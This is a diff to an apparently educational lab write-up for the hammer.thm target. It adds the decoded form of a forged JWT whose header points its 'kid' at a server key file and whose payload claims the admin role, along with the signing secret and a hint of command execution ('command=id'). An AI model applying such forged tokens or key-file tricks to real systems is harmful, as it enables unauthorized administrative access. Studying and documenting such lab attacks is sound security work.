@@ -312,6 +312,30 @@ command=id
 <p>Example forged JWT used in this lab:</p>
 <pre><code class="language-text">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzcwNTg0MDIzLCJleHAiOjE3NzA1ODc2MjMsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.3cm0ELDW_cOvXgbJkwh94XZPG7APVRECxWCEkjV9P0A
 </code></pre>
+<p>Which in cleartext and without padding basically translates to:</p>
+<pre><code class="language-json"># Header
+{
+  &quot;typ&quot;: &quot;JWT&quot;,
+  &quot;alg&quot;: &quot;HS256&quot;,
+  &quot;kid&quot;: &quot;/var/www/html/188ade1.key&quot;
+}
+
+# Payload
+{
+  &quot;iss&quot;: &quot;http://hammer.thm&quot;,
+  &quot;aud&quot;: &quot;http://hammer.thm&quot;,
+  &quot;iat&quot;: 1770584023,
+  &quot;exp&quot;: 1770587623,
+  &quot;data&quot;: {
+    &quot;user_id&quot;: 1,
+    &quot;email&quot;: &quot;tester@hammer.thm&quot;,
+    &quot;role&quot;: &quot;admin&quot;
+  }
+}
+
+# Signed with secret:
+# 56058354efb3daa97ebab00fabd7a7d7
+</code></pre>
 <h2>How this should have been prevented</h2>
 <p>Built-in JWT library validation + common best practices would have stopped this chain:</p>
 <ul>
